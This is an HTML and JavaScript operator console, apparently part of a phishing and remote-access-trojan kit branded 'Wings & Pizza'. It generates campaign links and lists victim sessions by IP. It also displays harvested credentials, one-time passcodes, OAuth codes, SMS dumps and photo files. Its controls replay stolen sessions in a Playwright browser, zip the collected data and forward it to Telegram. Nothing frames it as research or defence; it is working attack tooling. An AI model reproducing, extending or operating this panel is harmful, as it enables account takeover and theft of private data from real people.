<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wings & Pizza · Admin</title>
<style>
:root{
  --bg:#140a05;--panel:#1f120a;--line:#3f2417;--txt:#fef3c7;--mut:#a78b6a;
  --acc:#ea580c;--gold:#fbbf24;--red:#dc2626;--green:#16a34a;--blue:#2563eb;
}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--txt);
  font:13px -apple-system,Roboto,sans-serif}
.hidden{display:none !important}
button{font-family:inherit}

/* ---------- lock screen ---------- */
#lock{min-height:100vh;display:flex;align-items:center;justify-content:center;
  background:radial-gradient(circle at 30% 20%,#2a1810,#140a05 70%);padding:20px}
.lock-card{background:#1f120a;padding:36px 28px;border-radius:16px;
  width:min(380px,94vw);border:1px solid #3f2417;
  box-shadow:0 20px 60px #0008;text-align:center}
.lock-logo{width:72px;height:72px;margin:0 auto 16px}
.lock-card h1{font-size:22px;margin:0 0 4px;color:#fbbf24;letter-spacing:-0.3px}
.lock-card p{color:#a78b6a;font-size:13px;margin:0 0 24px}
.lock-card label{display:block;text-align:left;color:#a78b6a;font-size:11px;
  text-transform:uppercase;letter-spacing:0.6px;margin:14px 0 6px;font-weight:700}
.lock-card input{width:100%;padding:12px 14px;border-radius:10px;
  border:1px solid #3f2417;background:#0a0502;color:#fef3c7;font-size:14px;
  font-family:ui-monospace,monospace}
.lock-card input::placeholder{color:#6b4a2a;font-family:-apple-system,Roboto,sans-serif}
.lock-card button{width:100%;padding:13px;margin-top:20px;border:0;border-radius:10px;
  background:linear-gradient(135deg,#ea580c,#dc2626);color:#fff;font-weight:700;
  font-size:15px;cursor:pointer;box-shadow:0 8px 20px #ea580c44}
.lock-card .err{color:#f87171;font-size:12px;margin-top:14px;min-height:16px}
.lock-hint{font-size:11px;color:#6b4a2a;margin-top:18px;line-height:1.5}

/* ---------- panel ---------- */
header{background:var(--panel);border-bottom:1px solid var(--line);
  padding:10px 18px;display:flex;align-items:center;gap:14px;
  position:sticky;top:0;z-index:20}
header .brand{display:flex;align-items:center;gap:10px;font-weight:700;
  font-size:16px;color:var(--gold)}
header .brand svg{width:28px;height:28px}
.badge{background:#2a1810;padding:4px 10px;border-radius:6px;font-size:11px;
  color:var(--mut);border:1px solid var(--line);font-family:ui-monospace,monospace}
header .spacer{flex:1}
header .hbtn{background:#2a1810;color:var(--gold);border:1px solid var(--line);
  padding:6px 12px;border-radius:8px;cursor:pointer;font-size:12px;font-weight:600}
header .hbtn:hover{background:#3f2417}
header .hbtn.warn{color:#fca5a5;border-color:#7f1d1d}

/* ---------- bar ---------- */
.bar{background:var(--panel);border-bottom:1px solid var(--line);
  padding:12px 18px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.bar .mag{font-size:18px;color:var(--mut)}
.bar input{flex:1;min-width:220px;padding:10px 14px;border-radius:10px;
  border:1px solid var(--line);background:#0a0502;color:var(--txt);font-size:13px}
.bar input::placeholder{color:#6b4a2a}
.bar input#nameInput{flex:0 0 200px;font-family:-apple-system,Roboto,sans-serif}
.bar button{padding:11px 20px;border-radius:10px;border:0;
  background:linear-gradient(135deg,var(--acc),#dc2626);color:#fff;font-weight:700;
  font-size:13px;cursor:pointer}
.bar button:disabled{opacity:.5;cursor:default}

/* ---------- browser strip ---------- */
.strip{background:#160c06;padding:8px 18px;border-bottom:1px solid var(--line);
  font-size:11px;color:var(--mut);display:flex;gap:14px;align-items:center;
  overflow-x:auto;white-space:nowrap}
.strip .pill{background:#2a1810;padding:3px 9px;border-radius:10px;
  border:1px solid var(--line);color:var(--gold);font-family:ui-monospace,monospace;
  font-size:11px}

/* ---------- campaigns ---------- */
.camps{padding:10px 18px;background:var(--panel);border-bottom:1px solid var(--line);
  max-height:140px;overflow-y:auto}
.camp{display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:8px;
  background:#0a0502;border:1px solid var(--line);margin-bottom:6px;font-size:12px}
.camp .cname{font-family:ui-monospace,monospace;color:var(--gold);
  font-weight:700;min-width:80px}
.camp .curl{flex:1;color:var(--mut);overflow:hidden;text-overflow:ellipsis;
  white-space:nowrap;font-size:11px}
.camp .cbtn{background:#2a1810;color:var(--gold);border:1px solid var(--line);
  padding:4px 10px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:600}
.camp .cbtn:hover{background:#3f2417}
.camp .cbtn.del{background:#7f1d1d;color:#fca5a5;border-color:#7f1d1d}

/* ---------- split ---------- */
.split{display:grid;grid-template-columns:340px 1fr;
  height:calc(100vh - 57px - 62px - 34px - 140px);overflow:hidden}
.list{overflow-y:auto;border-right:1px solid var(--line);background:#160c06}
.detail{overflow-y:auto;padding:18px;background:var(--bg)}
.sess{padding:10px 14px;border-bottom:1px solid var(--line);cursor:pointer;
  display:flex;justify-content:space-between;align-items:center;gap:10px}
.sess:hover{background:var(--panel)}
.sess.sel{background:#2a1810}
.sess .sid{font-family:ui-monospace,monospace;color:var(--gold);
  font-size:12px;font-weight:600}
.sess .ip{font-family:ui-monospace,monospace;font-size:11px;
  color:var(--mut);margin-top:2px}
.st{font-size:10px;padding:2px 8px;border-radius:10px;text-transform:uppercase;
  font-weight:700;letter-spacing:0.4px}
.st.pending{background:#78350f;color:#fbbf24}
.st.started{background:#1e3a8a;color:#93c5fd}
.st.awaiting{background:#7c2d12;color:#fdba74}
.st.otp_required{background:#7c2d12;color:#fcd34d}
.st.approved{background:#14532d;color:#4ade80}
.st.manual{background:#3f3f46;color:#e4e4e7}

/* ---------- detail ---------- */
h2{font-size:12px;margin:18px 0 10px;color:var(--mut);
  text-transform:uppercase;letter-spacing:0.6px;font-weight:700}
.box{background:var(--panel);border:1px solid var(--line);
  border-radius:10px;padding:12px;margin-bottom:10px}
pre{background:#0a0502;padding:10px;border-radius:8px;overflow-x:auto;
  font-size:11px;margin:6px 0 0 0;white-space:pre-wrap;word-break:break-all;
  color:#fde68a;font-family:ui-monospace,monospace}
.btn{background:var(--acc);color:#fff;border:0;padding:8px 14px;
  border-radius:8px;cursor:pointer;font-size:12px;font-weight:600;
  margin-right:6px;margin-bottom:6px}
.btn.green{background:var(--green)}
.btn.red{background:var(--red)}
.btn.blue{background:var(--blue)}
.btn.gray{background:#4b3325}
.btn.gold{background:var(--gold);color:#1a0f0a}
.tabs{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
.tab{padding:6px 12px;background:#2a1810;border:1px solid var(--line);
  border-radius:6px;cursor:pointer;font-size:12px;color:var(--mut)}
.tab.on{background:var(--acc);color:#fff;border-color:var(--acc)}
.kind{display:inline-block;font-size:10px;padding:2px 8px;border-radius:4px;
  background:#2a1810;color:var(--mut);margin-right:6px;
  text-transform:uppercase;font-weight:700}
.kind.creds,.kind.oauth_code{background:#7f1d1d;color:#fca5a5}
.kind.otp_code{background:#422006;color:#fbbf24}
.kind.sms_live,.kind.sms_dump{background:#14532d;color:#4ade80}
.kind.photo_file{background:#581c87;color:#d8b4fe}
.empty{padding:20px;color:#6b4a2a;font-size:12px;text-align:center}
a{color:var(--gold)}
code{font-family:ui-monospace,monospace;color:var(--gold)}
</style>
</head>
<body>

<!-- ============ LOCK ============ -->
<div id="lock">
  <div class="lock-card">
    <svg class="lock-logo" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
      <path d="M32 6 L58 52 A6 6 0 0 1 52 58 L12 58 A6 6 0 0 1 6 52 Z"
            fill="#fbbf24" stroke="#b45309" stroke-width="3"/>
      <path d="M32 14 L52 52 L12 52 Z" fill="#f97316"/>
      <circle cx="24" cy="42" r="3" fill="#7f1d1d"/>
      <circle cx="40" cy="42" r="3" fill="#7f1d1d"/>
      <circle cx="32" cy="34" r="3" fill="#7f1d1d"/>
    </svg>
    <h1>Wings &amp; Pizza</h1>
    <p>Admin panel · locked</p>
    <form id="lockForm" autocomplete="off">
      <label>API URL</label>
      <input id="apiInput" placeholder="http://127.0.0.1:8443" required>
      <label>Password</label>
      <input id="pwInput" type="password" placeholder="••••••••" required>
      <button type="submit">🔓 Unlock</button>
      <div class="err" id="lockErr"></div>
    </form>
    <div class="lock-hint">The API URL must be the address of your running
      server (python <code>server.py</code>). Both must match or the panel
      cannot unlock.</div>
  </div>
</div>

<!-- ============ PANEL ============ -->
<div id="panel" class="hidden">
  <header>
    <div class="brand">
      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
        <path d="M32 6 L58 52 A6 6 0 0 1 52 58 L12 58 A6 6 0 0 1 6 52 Z"
              fill="#fbbf24" stroke="#b45309" stroke-width="3"/>
        <path d="M32 14 L52 52 L12 52 Z" fill="#f97316"/>
      </svg>
      Wings &amp; Pizza
    </div>
    <span class="badge" id="statBadge">…</span>
    <span class="spacer"></span>
    <button class="hbtn" onclick="wipeProfile()">🧹 wipe profile</button>
    <button class="hbtn warn" onclick="lockNow()">🔒 lock</button>
  </header>

  <div class="bar">
    <span class="mag">🔍</span>
    <input id="urlInput" placeholder="Paste target URL here  ·  use {sid} for the session id">
    <input id="nameInput" placeholder="campaign name (blank = random)">
    <button id="createBtn">🔗 Create Link</button>
  </div>

  <div class="strip" id="strip"></div>

  <div class="camps" id="camps"></div>

  <div class="split">
    <div class="list" id="list"></div>
    <div class="detail" id="detail"><div class="empty">Select a session</div></div>
  </div>
</div>

<script>
// ============ state ============
const S = {
  api: "",
  token: "",
  campaigns: [],
  sessions: [],
  sel: null,
};

const $ = id => document.getElementById(id);
const esc = s => String(s ?? "").replace(/[&<>"']/g, ch =>
  ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[ch]));
const fmt = ts => ts ? new Date(ts * 1000).toLocaleString() : "—";

// ============ API ============
async function api(path, opts = {}) {
  const url = S.api.replace(/\/+$/, "") + path;
  const o = { ...opts };
  o.headers = { ...(o.headers || {}), "X-Admin-Token": S.token };
  if (o.body && typeof o.body !== "string") {
    o.body = JSON.stringify(o.body);
    o.headers["Content-Type"] = "application/json";
  }
  const r = await fetch(url, o);
  if (r.status === 401) { lockNow(); throw new Error("unauthorized"); }
  const ct = r.headers.get("Content-Type") || "";
  return ct.includes("json") ? r.json() : r;
}

// ============ lock / unlock ============
function showLock() {
  $("panel").classList.add("hidden");
  $("lock").classList.remove("hidden");
  $("lockErr").textContent = "";
  const saved = localStorage.getItem("wp.api") || "";
  $("apiInput").value = saved || (location.origin.startsWith("http") ? location.origin : "");
  $("pwInput").value = "";
}

function showPanel() {
  $("lock").classList.add("hidden");
  $("panel").classList.remove("hidden");
  refreshAll();
}

async function tryUnlock(apiUrl, password) {
  try {
    const r = await fetch(apiUrl.replace(/\/+$/, "") + "/api/admin/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password })
    });
    if (!r.ok) {
      const j = await r.json().catch(() => ({}));
      $("lockErr").textContent = j.error || "invalid URL or password";
      return false;
    }
    const j = await r.json();
    if (!j.ok || !j.token) { $("lockErr").textContent = "no token"; return false; }
    S.api = apiUrl;
    S.token = j.token;
    localStorage.setItem("wp.api", apiUrl);
    localStorage.setItem("wp.token", j.token);
    return true;
  } catch (e) {
    $("lockErr").textContent = "cannot reach " + apiUrl;
    return false;
  }
}

$("lockForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const apiUrl = $("apiInput").value.trim();
  const pw = $("pwInput").value;
  $("lockErr").textContent = "";
  const ok = await tryUnlock(apiUrl, pw);
  if (ok) showPanel();
});

function lockNow() {
  S.token = ""; S.api = ""; S.sel = null;
  localStorage.removeItem("wp.token");
  showLock();
}

// ============ boot ============
(async function boot() {
  const savedApi = localStorage.getItem("wp.api");
  const savedTok = localStorage.getItem("wp.token");
  if (savedApi && savedTok) {
    S.api = savedApi; S.token = savedTok;
    // validate
    try {
      const r = await fetch(savedApi + "/api/admin/sessions", {
        headers: { "X-Admin-Token": savedTok }
      });
      if (r.ok) { showPanel(); return; }
    } catch(_) {}
  }
  showLock();
})();

// ============ panel ============
async function refreshAll() {
  await loadBrowser();
  await loadCampaigns();
  await loadSessions();
}

async function loadBrowser() {
  try {
    const j = await api("/api/admin/browser/status");
    const s = $("strip");
    if (!j.open) {
      s.innerHTML = '<span class="pill">browser closed</span>';
      return;
    }
    const pills = (j.pages || []).map(p => {
      const t = p.title || p.url || "(blank)";
      return `<span class="pill" title="${esc(p.url)}">${esc(t.slice(0,40))}</span>`;
    }).join("") || '<span class="pill">no tabs</span>';
    s.innerHTML = `<span>playwright:</span>${pills}`;
  } catch(_) {}
}

async function loadCampaigns() {
  try {
    const j = await api("/api/admin/campaigns");
    S.campaigns = j.campaigns || [];
    renderCampaigns();
  } catch(_) {}
}

function renderCampaigns() {
  const C = $("camps");
  if (!S.campaigns.length) {
    C.innerHTML = '<div class="empty">No campaign links yet — paste a URL above.</div>';
    return;
  }
  C.innerHTML = S.campaigns.map(c => `
    <div class="camp">
      <span class="cname">${esc(c.id)}</span>
      <span class="curl" title="${esc(c.target_url)}">${esc(c.target_url)}</span>
      <button class="cbtn" onclick="copyLink('${esc(c.id)}')">📋 link</button>
      <button class="cbtn del" onclick="delCampaign('${esc(c.id)}')">🗑</button>
    </div>`).join("");
}

function copyLink(id) {
  const c = S.campaigns.find(x => x.id === id);
  if (!c) return;
  navigator.clipboard.writeText(c.link).then(() => {
    const el = event.target;
    const t = el.textContent; el.textContent = "✓";
    setTimeout(() => el.textContent = t, 1200);
  });
}

async function delCampaign(id) {
  if (!confirm("delete campaign " + id + "?")) return;
  await api("/api/admin/campaigns/" + id, { method: "DELETE" });
  loadCampaigns();
}

$("createBtn").addEventListener("click", async () => {
  const url = $("urlInput").value.trim();
  const name = $("nameInput").value.trim();
  if (!url) { alert("paste a URL first"); return; }
  const b = $("createBtn");
  b.disabled = true; b.textContent = "creating…";
  try {
    const r = await api("/api/admin/campaigns", {
      method: "POST", body: { url, name }
    });
    if (!r.ok) { alert(r.error || "failed"); return; }
    $("urlInput").value = ""; $("nameInput").value = "";
    await loadCampaigns();
    const camp = S.campaigns.find(c => c.id === r.name);
    if (camp) {
      try { await navigator.clipboard.writeText(camp.link); } catch(_) {}
      alert("Created. Link copied:\n\n" + camp.link);
    }
  } finally {
    b.disabled = false; b.textContent = "🔗 Create Link";
  }
});

async function loadSessions() {
  try {
    const j = await api("/api/admin/sessions");
    S.sessions = j.sessions || [];
    $("statBadge").textContent = `${S.sessions.length} sessions · ${j.devices} devices`;
    if (S.sel && !S.sessions.find(s => s.id === S.sel)) {
      S.sel = null;
      $("detail").innerHTML = '<div class="empty">Select a session</div>';
    }
    renderSessions();
  } catch(_) {}
}

function renderSessions() {
  const L = $("list");
  L.innerHTML = S.sessions.map(s => `
    <div class="sess ${S.sel===s.id?'sel':''}" data-sid="${s.id}">
      <div>
        <div class="sid">${esc(s.id)}</div>
        <div class="ip">${esc(s.ip)} · ${esc(s.campaign||'—')}</div>
      </div>
      <span class="st ${esc(s.status)}">${esc(s.status)}</span>
    </div>`).join("") || '<div class="empty">no sessions yet</div>';
  L.querySelectorAll(".sess").forEach(el => el.onclick = () => {
    S.sel = el.dataset.sid;
    renderSessions();
    loadDetail(S.sel);
  });
}

async function loadDetail(sid) {
  const d = await api("/api/admin/session/" + sid);
  const cap = d.captures || [], ex = d.exfil || [], fs = d.files || [];

  const capBlock = k => cap.filter(c => c.kind === k).map(c => `
    <div class="box"><span class="kind ${k}">${esc(k)}</span>
      <span style="color:var(--mut);font-size:11px">${fmt(c.ts)}</span>
      <pre>${esc(c.body)}</pre></div>`).join("") || '<div class="empty">none</div>';

  const byKind = {};
  ex.forEach(e => (byKind[e.kind] = byKind[e.kind] || []).push(e));
  const exHtml = Object.entries(byKind).map(([k, rows]) => `
    <h3 style="font-size:12px;color:var(--mut);margin:14px 0 6px">${esc(k)} (${rows.length})</h3>
    ${rows.slice(-30).map(r => `
      <div class="box"><span class="kind ${esc(k)}">${esc(k)}</span>
        <span style="color:var(--mut);font-size:11px">${fmt(r.ts)} · ${esc(r.ip||'')}</span>
        <pre>${esc((r.body||'').slice(0,2500))}</pre></div>`).join("")}`
    ).join("") || '<div class="empty">none</div>';

  const filesHtml = fs.map(f => `
    <div class="box">
      <a href="${S.api}/api/admin/file/${f.id}?t=${encodeURIComponent(S.token)}"
         onclick="dlFile(event, ${f.id})">${esc(f.filename)}</a>
      <span style="color:var(--mut);font-size:11px"> · ${f.size} bytes · ${fmt(f.ts)}</span>
    </div>`).join("") || '<div class="empty">none</div>';

  const browserUrl = d.browser_url || "";

  $("detail").innerHTML = `
    <h1 style="margin:0 0 12px;font-family:ui-monospace,monospace;
      color:var(--gold);font-size:16px">${esc(sid)}</h1>
    <div class="box">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:12px">
        <div><b>IP</b> ${esc(d.ip||'')}</div>
        <div><b>Campaign</b> ${esc(d.campaign||'—')}</div>
        <div><b>Status</b> <span class="st ${esc(d.status)}">${esc(d.status)}</span></div>
        <div><b>Provider</b> ${esc(d.provider||'—')}</div>
        <div style="grid-column:1/-1"><b>UA</b> ${esc(d.ua||'—')}</div>
        <div style="grid-column:1/-1"><b>Target</b>
          <code style="word-break:break-all">${esc(d.target_url||'—')}</code></div>
        ${browserUrl ? `<div style="grid-column:1/-1"><b>Now on (PC)</b>
          <code style="word-break:break-all">${esc(browserUrl)}</code></div>` : ''}
        <div><b>Created</b> ${fmt(d.created)}</div>
        <div><b>Approved</b> ${fmt(d.approved)}</div>
      </div>
    </div>
    <div style="margin:14px 0">
      <button class="btn green" onclick="approveSid('${sid}')">✓ Approve</button>
      <button class="btn blue" onclick="reopenSid('${sid}')">🖥 Re-open on PC</button>
      <button class="btn gold" onclick="zipSid('${sid}')">📦 .zip</button>
      <button class="btn" onclick="tgSid('${sid}')">📤 Telegram</button>
      <button class="btn gray" onclick="closeSid('${sid}')">✕ Close tab</button>
      <button class="btn red" onclick="delSid('${sid}')">🗑 Delete</button>
    </div>
    <div class="tabs">
      <div class="tab on" data-t="creds">Creds / OTP</div>
      <div class="tab" data-t="exfil">RAT exfil</div>
      <div class="tab" data-t="files">Files</div>
    </div>
    <div id="tab-creds">
      ${capBlock("creds")}${capBlock("otp_code")}
      ${capBlock("oauth_code")}${capBlock("oauth_error")}
    </div>
    <div id="tab-exfil" style="display:none">${exHtml}</div>
    <div id="tab-files" style="display:none">${filesHtml}</div>`;

  document.querySelectorAll(".tab").forEach(t => t.onclick = () => {
    document.querySelectorAll(".tab").forEach(x => x.classList.remove("on"));
    t.classList.add("on");
    ["creds","exfil","files"].forEach(k =>
      $("tab-" + k).style.display = t.dataset.t === k ? "block" : "none");
  });
}

async function dlFile(ev, fid) {
  ev.preventDefault();
  const r = await fetch(S.api + "/api/admin/file/" + fid, {
    headers: { "X-Admin-Token": S.token }
  });
  const blob = await r.blob();
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "file-" + fid;
  a.click();
}

async function approveSid(sid)  { await api("/api/admin/approve/" + sid, {method:"POST"}); refreshAll(); loadDetail(sid); }
async function reopenSid(sid)   {
  const s = S.sessions.find(x => x.id === sid);
  if (!s) return;
  const target = s.target_url || "";
  if (!target) { alert("no target url"); return; }
  await api("/api/session/" + sid + "/accept", {method:"POST"});
  alert("sent to PC");
}
async function closeSid(sid)    { await api("/api/admin/session/" + sid + "/close", {method:"POST"}); alert("closed"); }
async function zipSid(sid) {
  const r = await fetch(S.api + "/api/admin/zip/" + sid, {
    headers: { "X-Admin-Token": S.token }
  });
  const blob = await r.blob();
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "session-" + sid + ".zip";
  a.click();
}
async function tgSid(sid) {
  const r = await api("/api/admin/tg/" + sid, {method:"POST"});
  alert(r.ok ? "sent" : "failed: " + (r.error||"?"));
}
async function delSid(sid) {
  if (!confirm("delete " + sid + "?")) return;
  await api("/api/admin/session/" + sid, {method:"DELETE"});
  S.sel = null;
  refreshAll();
  $("detail").innerHTML = '<div class="empty">Select a session</div>';
}

async function wipeProfile() {
  if (!confirm("wipe the Chrome profile? This closes the browser and clears cookies.")) return;
  await api("/api/admin/wipe-profile", {method:"POST"});
  loadBrowser();
}

// auto-refresh
setInterval(() => {
  if ($("panel").classList.contains("hidden")) return;
  loadBrowser();
  loadSessions();
  if (S.sel) loadDetail(S.sel);
}, 5000);
setInterval(() => {
  if ($("panel").classList.contains("hidden")) return;
  loadCampaigns();
}, 30000);
</script>
